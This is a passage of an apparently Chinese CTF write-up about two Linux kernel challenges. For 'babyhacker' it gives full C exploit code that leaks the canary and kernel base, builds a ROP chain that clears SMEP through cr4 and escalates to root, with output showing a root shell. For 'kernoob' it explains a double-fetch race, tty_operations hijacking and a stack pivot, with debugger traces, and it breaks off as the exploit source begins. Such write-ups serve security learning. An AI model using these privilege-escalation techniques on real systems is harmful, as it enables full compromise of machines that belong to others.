class="line">    <span class="string">"pushf;"</span></span><br><span class="line">    <span class="string">"pop user_rflags"</span></span><br><span class="line">    );</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*] status has been saved\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">size_t</span> pop_rdi = <span class="number">0xffffffff8109054d</span>,pop_rdx =<span class="number">0xffffffff81083f22</span>;</span><br><span class="line"><span class="keyword">size_t</span> pop_rcx = <span class="number">0xffffffff81006ffc</span>,mov_rc4_pop_ret = <span class="number">0xffffffff81004d70</span>;</span><br><span class="line"><span class="keyword">size_t</span> swapgs = <span class="number">0xffffffff810636b4</span>,iretq_ret = <span class="number">0xffffffff81478294</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_root</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    commit_creds(prepare_kernel_cred(<span class="number">0</span>));</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    save_status();</span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">"/dev/babyhacker"</span>,O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span>(fd &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"fd error"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    getchar();</span><br><span class="line">    ioctl(fd,<span class="number">0x30000</span>,<span class="number">0x80000100</span>);</span><br><span class="line">    <span class="keyword">size_t</span> buf[<span class="number">0x1000</span>];</span><br><span class="line">    ioctl(fd,<span class="number">0x30002</span>,buf);</span><br><span class="line">    <span class="keyword">size_t</span> * buf_c = (<span class="keyword">size_t</span> *)buf;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i&lt;<span class="number">0x50</span>;i++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"idx:%d value:0x%lx\n"</span>,i,buf_c[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">size_t</span> canary = buf_c[<span class="number">8</span>];</span><br><span class="line">    <span class="keyword">size_t</span> offset = <span class="number">0xffffffff810c31d0</span> -  buf_c[<span class="number">12</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*]canary:0x%lx\n"</span>,canary);</span><br><span class="line">    commit_creds += offset;</span><br><span class="line">    prepare_kernel_cred += offset;</span><br><span class="line">    pop_rdi +=offset;</span><br><span class="line">    iretq_ret += offset;</span><br><span class="line">    mov_rc4_pop_ret += offset;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*] commit_cred: 0x%lx\n"</span>,commit_creds);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*] prepare_kernel_cred : 0x%lx\n"</span>,prepare_kernel_cred);</span><br><span class="line">    ioctl(fd,<span class="number">0x30000</span>,<span class="number">0x80001000</span>);</span><br><span class="line">    <span class="keyword">size_t</span> rop[<span class="number">0x100</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> i=<span class="number">40</span>;</span><br><span class="line">    rop[i++] = canary;</span><br><span class="line">    rop[i++] = <span class="number">0</span>;</span><br><span class="line">    rop[i++] = pop_rdi;</span><br><span class="line">    rop[i++] = <span class="number">0x6f0</span>;</span><br><span class="line">    rop[i++] = mov_rc4_pop_ret;</span><br><span class="line">    rop[i++] = <span class="number">0</span>;</span><br><span class="line">    rop[i++] = (<span class="keyword">size_t</span>)get_root;</span><br><span class="line">    rop[i++] = swapgs;</span><br><span class="line">    rop[i++] = <span class="number">0</span>;</span><br><span class="line">    rop[i++] = iretq_ret;</span><br><span class="line">    rop[i++] = (<span class="keyword">size_t</span>)get_shell;</span><br><span class="line">    rop[i++] = user_cs;</span><br><span class="line">    rop[i++] = user_rflags;</span><br><span class="line">    rop[i++] = user_sp;</span><br><span class="line">    rop[i++] = user_ss;</span><br><span class="line"></span><br><span class="line">    ioctl(fd,<span class="number">0x30001</span>,rop);</span><br><span class="line">    <span class="comment">//rop[i++] = </span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[*]canary:0x8e9280f76a472054</span><br><span class="line">[*] commit_cred: 0xffffffff810a1430</span><br><span class="line">[*] prepare_kernel_cred : 0xffffffff810a1820</span><br><span class="line">suceess</span><br><span class="line">/home/pwn # id</span><br><span class="line">uid=0(root) gid=0</span><br><span class="line">/home/pwn #</span><br></pre></td></tr></table></figure><h2 id="2-kernoob"><a href="#2-kernoob" class="headerlink" title="2.kernoob"></a>2.kernoob</h2><h4 id="go-1"><a href="#go-1" class="headerlink" title="go"></a>go</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bzImage</span><br><span class="line">initramfs.cpio</span><br><span class="line">noob.ko</span><br><span class="line">startvm.sh</span><br></pre></td></tr></table></figure><p>startvm.sh</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">stty intr ^]</span><br><span class="line">cd `dirname $0`</span><br><span class="line">timeout --foreground 600 qemu-system-x86_64 \</span><br><span class="line">    -m 128M \</span><br><span class="line">    -nographic \</span><br><span class="line">    -kernel bzImage \</span><br><span class="line">    -append &apos;console=ttyS0 loglevel=3 pti=off oops=panic panic=1 nokaslr&apos; \</span><br><span class="line">    -monitor /dev/null \</span><br><span class="line">    -initrd initramfs.cpio \</span><br><span class="line">    -smp 2,cores=2,threads=1 \</span><br><span class="line">    -cpu qemu64,smep 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p>开了smep，没开nokaslr<br>smep 只有改cr4就可以绕过<br>比赛的时候有个师傅说是double fetch，然后我就想不出是哪里double fetch，后来看到一位师傅的博客讲到三种情况的 double fetch<br>下面引用师傅说的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1、Shallow Copy</span><br><span class="line">这种数据传递通常是结构体类型的变量传递，结构体中包含了指针，当把这个数据传递进内核时，只是得到了结构体的数据，也就是浅拷贝，如果对结构体中的指针验证过后使用之前，恶意线程修改了这个指针，便是绕过了验证</span><br><span class="line">2、Type Selection</span><br><span class="line">第一次传递根据header决定数据类型，根据不同类型来接受第二次传递，在这之间修改了数据，则造成数据与类型不匹配，如cxgb3 main.c中的一段代码</span><br><span class="line">3、Size Checking</span><br><span class="line">第一次传递根据header获取size，申请对应大小的buf，第二次传递接受数据存入buf</span><br><span class="line"> for ----Mask 师傅</span><br></pre></td></tr></table></figure><p>这次比赛的类型就是就跟第三种类似</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"> 1 <span class="comment">#!/bin/sh</span></span><br><span class="line"> 2 </span><br><span class="line"> 3 <span class="built_in">echo</span> <span class="string">"Welcome :)"</span></span><br><span class="line"> 4 </span><br><span class="line"> 5 mount -t proc none /proc</span><br><span class="line"> 6 mount -t devtmpfs none /dev</span><br><span class="line"> 7 mkdir /dev/pts</span><br><span class="line"> 8 mount /dev/pts</span><br><span class="line"> 9 </span><br><span class="line">10 insmod /home/pwn/noob.ko</span><br><span class="line">11 chmod 666 /dev/noob</span><br><span class="line">12 </span><br><span class="line">13 <span class="built_in">echo</span> 0 &gt; /proc/sys/kernel/dmesg_restrict</span><br><span class="line">14 <span class="built_in">echo</span> 0 &gt; /proc/sys/kernel/kptr_restrict</span><br><span class="line">15 </span><br><span class="line">16 <span class="built_in">cd</span> /home/pwn</span><br><span class="line">17 setsid /bin/cttyhack setuidgid 0 sh</span><br><span class="line">18 </span><br><span class="line">19 umount /proc</span><br><span class="line">20 poweroff -f</span><br></pre></td></tr></table></figure><p>内核加载了noob.ko驱动 </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">signed</span> __int64 __usercall add_note@&lt;rax&gt;(__int64 a1@&lt;rbp&gt;, <span class="keyword">unsigned</span> __int64 *a2@&lt;rdi&gt;)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp-20h] [rbp-20h]</span></span><br><span class="line">  __int64 v4; <span class="comment">// [rsp-18h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  _fentry__(a2);</span><br><span class="line">  v3 = *a2;</span><br><span class="line">  <span class="keyword">if</span> ( a2[<span class="number">2</span>] &gt; <span class="number">0x70</span> || a2[<span class="number">2</span>] &lt;= <span class="number">0x1F</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1L</span>L;</span><br><span class="line">  <span class="keyword">if</span> ( v3 &gt; <span class="number">0x1F</span> || *((_QWORD *)&amp;pool + <span class="number">2</span> * v3) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1L</span>L;</span><br><span class="line">  v4 = _kmalloc(a2[<span class="number">2</span>], <span class="number">0x14000C0</span>LL);</span><br><span class="line">  <span class="keyword">if</span> ( !v4 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1L</span>L;</span><br><span class="line">  *((_QWORD *)&amp;pool + <span class="number">2</span> * v3) = v4;</span><br><span class="line">  qword_BC8[<span class="number">2</span> * v3] = a2[<span class="number">2</span>];</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里在判断 size 和分配size是分开来判断的,如果这时候判断size完了，然后有另一个线程出现，然后修改<br>size，那是不是就可以分配到我们想要分配到的size，在kernel中存在一种tty_struct结构，大小是0x2e0。<br>利用有个 tty_operations 结构体，利用来很多函数，这也许就是传说中的风水地。<br>如果能修改其中一个或者劫持掉，那岂不是可以执行rop了<br>但是执行rop需要在知道栈的地址，那我们是不是可以先mmap一个可以执行内存，然后跳到这里来。<br>劫持 函数的时候要 利用寄存器中的值，和esp的值来实现<br>然后 需要把rop复制到开辟的栈上<br>然后smep 跟上面一样<br>然后就是getshell</p><h3 id="调试-1"><a href="#调试-1" class="headerlink" title="调试"></a>调试</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/home/pwn # lsmod</span><br><span class="line">noob 16384 0 - Live 0xffffffffc0002000 (OE)</span><br></pre></td></tr></table></figure><p>首先，先malloc到我们想要的size的chunk</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">char</span> *buf2 = (<span class="keyword">char</span>*) <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">  save_status();</span><br><span class="line">  buf[<span class="number">0</span>] = <span class="number">0x0</span>;</span><br><span class="line">  <span class="keyword">int</span> fd  = open(<span class="string">"/dev/noob"</span>,O_RDONLY);</span><br><span class="line">  <span class="keyword">pthread_t</span> t1;</span><br><span class="line">  pthread_create(&amp;t1,<span class="literal">NULL</span>,change,&amp;buf[<span class="number">2</span>]);</span><br><span class="line">  buf[<span class="number">0</span>]=<span class="number">0</span>;</span><br><span class="line">  buf[<span class="number">2</span>]=<span class="number">0x0</span>;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">0x100000</span>;i++)</span><br><span class="line">  &#123;   </span><br><span class="line">buf[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">      ioctl(fd,<span class="number">0x30000</span>,buf);</span><br><span class="line">  &#125;</span><br><span class="line">  fff=<span class="number">0</span>;</span><br><span class="line">  pthread_join(t1,<span class="literal">NULL</span>);</span><br><span class="line">  ioctl(fd,<span class="number">0x30001</span>,buf);</span><br></pre></td></tr></table></figure><p>然后就能malloc到 我们想要的chunk</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/20xg 0xffffffffc00044c0</span><br><span class="line">0xffffffffc00044c0:0xffff8800058a6c000x00000000000002e0</span><br><span class="line">0xffffffffc00044d0:0x00000000000000000x0000000000000000</span><br></pre></td></tr></table></figure><p>那之后就是伪造 tty_operations</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_operations</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> *(*<span class="title">lookup</span>)(<span class="title">struct</span> <span class="title">tty_driver</span> *, <span class="title">struct</span> <span class="title">file</span> *, <span class="title">int</span>);</span> <span class="comment">/*     0     8 */</span></span><br><span class="line">    <span class="keyword">int</span> (*install)(struct tty_driver *, struct tty_struct *);              <span class="comment">/*     8     8 */</span></span><br><span class="line">    <span class="keyword">void</span> (*remove)(struct tty_driver *, struct tty_struct *);              <span class="comment">/*    16     8 */</span></span><br><span class="line">    <span class="keyword">int</span> (*open)(struct tty_struct *, struct file *);                       <span class="comment">/*    24     8 */</span></span><br><span class="line">    <span class="keyword">void</span> (*close)(struct tty_struct *, struct file *);                     <span class="comment">/*    32     8 */</span></span><br><span class="line">    <span class="keyword">void</span> (*shutdown)(struct tty_struct *);                                 <span class="comment">/*    40     8 */</span></span><br><span class="line">    <span class="keyword">void</span> (*cleanup)(struct tty_struct *);                                  <span class="comment">/*    48     8 */</span></span><br><span class="line">    <span class="keyword">int</span> (*write)(struct tty_struct *, <span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> *, <span class="keyword">int</span>);         <span class="comment">/*    56     8 */</span></span><br><span class="line">    <span class="comment">/* --- cacheline 1 boundary (64 bytes) --- */</span></span><br><span class="line">    <span class="keyword">int</span> (*put_char)(struct tty_struct *, <span class="keyword">unsigned</span> <span class="keyword">char</span>);                            <span class="comment">/*    64     8 */</span></span><br><span class="line">    <span class="keyword">void</span> (*flush_chars)(struct tty_struct *);                                       <span class="comment">/*    72     8 */</span></span><br><span class="line">    <span class="keyword">int</span> (*write_room)(struct tty_struct *);                                         <span class="comment">/*    80     8 */</span></span><br><span class="line">    <span class="keyword">int</span> (*chars_in_buffer)(struct tty_struct *);                                    <span class="comment">/*    88     8 */</span></span><br><span class="line">    <span class="keyword">int</span> (*ioctl)(struct tty_struct *, <span class="keyword">unsigned</span> <span class="keyword">int</span>, <span class="keyword">long</span> <span class="keyword">unsigned</span> <span class="keyword">int</span>);             <span class="comment">/*    96     8 */</span></span><br><span class="line">    <span class="function"><span class="keyword">long</span> <span class="title">int</span> <span class="params">(*compat_ioctl)</span><span class="params">(struct tty_struct *, <span class="keyword">unsigned</span> <span class="keyword">int</span>, <span class="keyword">long</span> <span class="keyword">unsigned</span> <span class="keyword">int</span>)</span></span>; <span class="comment">/*   104     8 */</span></span><br><span class="line">    <span class="keyword">void</span> (*set_termios)(struct tty_struct *, struct ktermios *);                    <span class="comment">/*   112     8 */</span></span><br><span class="line">    <span class="keyword">void</span> (*throttle)(struct tty_struct *);                                          <span class="comment">/*   120     8 */</span></span><br><span class="line">    <span class="comment">/* --- cacheline 2 boundary (128 bytes) --- */</span></span><br><span class="line">    <span class="keyword">void</span> (*unthrottle)(struct tty_struct *);           <span class="comment">/*   128     8 */</span></span><br><span class="line">    <span class="keyword">void</span> (*stop)(struct tty_struct *);                 <span class="comment">/*   136     8 */</span></span><br><span class="line">    <span class="keyword">void</span> (*start)(struct tty_struct *);                <span class="comment">/*   144     8 */</span></span><br><span class="line">    <span class="keyword">void</span> (*hangup)(struct tty_struct *);               <span class="comment">/*   152     8 */</span></span><br><span class="line">    <span class="keyword">int</span> (*break_ctl)(struct tty_struct *, <span class="keyword">int</span>);        <span class="comment">/*   160     8 */</span></span><br><span class="line">    <span class="keyword">void</span> (*flush_buffer)(struct tty_struct *);         <span class="comment">/*   168     8 */</span></span><br><span class="line">    <span class="keyword">void</span> (*set_ldisc)(struct tty_struct *);            <span class="comment">/*   176     8 */</span></span><br><span class="line">    <span class="keyword">void</span> (*wait_until_sent)(struct tty_struct *, <span class="keyword">int</span>); <span class="comment">/*   184     8 */</span></span><br><span class="line">    <span class="comment">/* --- cacheline 3 boundary (192 bytes) --- */</span></span><br><span class="line">    <span class="keyword">void</span> (*send_xchar)(struct tty_struct *, <span class="keyword">char</span>);                           <span class="comment">/*   192     8 */</span></span><br><span class="line">    <span class="keyword">int</span> (*tiocmget)(struct tty_struct *);                                    <span class="comment">/*   200     8 */</span></span><br><span class="line">    <span class="keyword">int</span> (*tiocmset)(struct tty_struct *, <span class="keyword">unsigned</span> <span class="keyword">int</span>, <span class="keyword">unsigned</span> <span class="keyword">int</span>);        <span class="comment">/*   208     8 */</span></span><br><span class="line">    <span class="keyword">int</span> (*resize)(struct tty_struct *, struct winsize *);                    <span class="comment">/*   216     8 */</span></span><br><span class="line">    <span class="keyword">int</span> (*set_termiox)(struct tty_struct *, struct termiox *);               <span class="comment">/*   224     8 */</span></span><br><span class="line">    <span class="keyword">int</span> (*get_icount)(struct tty_struct *, struct serial_icounter_struct *); <span class="comment">/*   232     8 */</span></span><br><span class="line">    <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> *<span class="title">proc_fops</span>;</span>                                 <span class="comment">/*   240     8 */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* size: 248, cachelines: 4, members: 31 */</span></span><br><span class="line">    <span class="comment">/* last cacheline: 56 bytes */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>修改ioctl 为我们的转移栈的地址 我们可以利用xchg eax，esp</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">RAX  0xffffffff8101db17 ◂— xchg   eax, esp /* 0x63be0025394cc394 */</span><br><span class="line"> RBX  0x0</span><br><span class="line"> RCX  0x6e23a0 ◂— 0</span><br><span class="line"> RDX  0x0</span><br><span class="line"> RDI  0xffff8800058a6c00 ◂— add    dword ptr [rax + rax], edx /* 0x100005401 */</span><br><span class="line"> RSI  0x0</span><br><span class="line"> R8   0x0</span><br><span class="line"> R9   0xffffabf2</span><br><span class="line"> R10  0x0</span><br><span class="line"> R11  0x0</span><br><span class="line"> R12  0xffff8800058a6c00 ◂— add    dword ptr [rax + rax], edx /* 0x100005401 */</span><br><span class="line"> R13  0x0</span><br><span class="line"> R14  0xffff880005874c00 ◂— 0</span><br><span class="line"> R15  0xffff8800058a6400 ◂— add    dword ptr [rax + rax], edx /* 0x100005401 */</span><br><span class="line"> RBP  0xffffc9000024fe60 —▸ 0xffffc9000024fee8 —▸ 0xffffc9000024ff28 —▸ 0xffffc9000024ff48 ◂— 0</span><br><span class="line"> RSP  0xffffc9000024fdb0 —▸ 0xffffffff815d0786 ◂— 0xae850ffffffdfd3d</span><br><span class="line"> RIP  0xffffffff8101db17 ◂— xchg   eax, esp /* 0x63be0025394cc394 */</span><br></pre></td></tr></table></figure><p>然后就将栈转移到了 0x8101db17</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">00:0000│ rsp  0x8101db17 —▸ 0xffffffff813f6c9d ◂— pop    rdi /* 0x40478b480080c35f */</span><br><span class="line">01:0008│      0x8101db1f ◂— 0x6f0</span><br><span class="line">02:0010│      0x8101db27 —▸ 0xffffffff81069b14 ◂— 0x801f0fc35de7220f</span><br><span class="line">03:0018│      0x8101db2f ◂— 0</span><br><span class="line">04:0020│      0x8101db37 —▸ 0x400a4c ◂— 0xec834853e5894855</span><br><span class="line">05:0028│      0x8101db3f ◂— 0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">   0xffffffff8101db17    xchg   eax, esp</span><br><span class="line"> ► 0xffffffff8101db18    ret    &lt;0xffffffff813f6c9d&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0xffffffff813f6c9d    pop    rdi</span><br><span class="line">   0xffffffff813f6c9e    ret    </span><br><span class="line">    ↓</span><br><span class="line">   0xffffffff81069b14    mov    cr4, rdi</span><br><span class="line">   0xffffffff81069b17    pop    rbp</span><br><span class="line">   0xffffffff81069b18    ret    </span><br><span class="line">    ↓</span><br><span class="line">   0x400a4c              push   rbp</span><br><span class="line">   0x400a4d              mov    rbp, rsp</span><br><span class="line">   0x400a50              push   rbx</span><br><span class="line">   0x400a51              sub    rsp, 8</span><br></pre></td></tr></table></figure><p>剩下就跟上面差不多就是写rop，绕过smep，再执行commit_creds(prepare_kernel_cred(0)); 然后getshell<br>exp</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span 